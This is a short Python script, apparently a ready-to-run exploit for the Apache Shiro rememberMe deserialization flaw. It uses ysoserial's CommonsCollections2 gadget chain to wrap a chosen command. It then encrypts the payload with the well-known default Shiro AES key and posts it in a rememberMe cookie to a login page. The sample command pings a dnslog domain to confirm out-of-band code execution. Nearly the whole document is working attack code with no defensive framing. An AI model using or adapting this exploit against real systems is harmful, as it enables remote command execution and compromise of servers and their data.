# -*- encoding:utf-8 -*-
import sys 
import base64 
import uuid 
import subprocess 
import requests 
from Crypto.Cipher import AES 

def encode_rememberme(command): 
	JAR_FILE = './ysoserial-0.0.6-SNAPSHOT-BETA-all.jar' 
	popen = subprocess.Popen(['java', '-jar',JAR_FILE, 'CommonsCollections2', command], stdout=subprocess.PIPE) 
	BS = AES.block_size 
	pad = lambda s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode() 
	key = "kPH+bIxk5D2deZiIxcaaaA=="
	mode = AES.MODE_CBC 
	iv = uuid.uuid4().bytes 
	encryptor = AES.new(base64.b64decode(key), mode, iv) 
	file_body = pad(popen.stdout.read()) 
	base64_ciphertext = base64.b64encode(iv + encryptor.encrypt(file_body)) 
	return base64_ciphertext 

def request(url,headers): 
	requests.post(url=url, data="", headers=headers,verify=False) 

if __name__ == '__main__': 
	url= "http://127.0.0.1/login.do" 
	cmd= "ping apache.dnslog.org" 
	payload = encode_rememberme(cmd) 
	headers = {
		"Cookie": "rememberMe=%s" % (payload.decode())
	} 
	print payload
	request(url,headers) 
	print "END===="

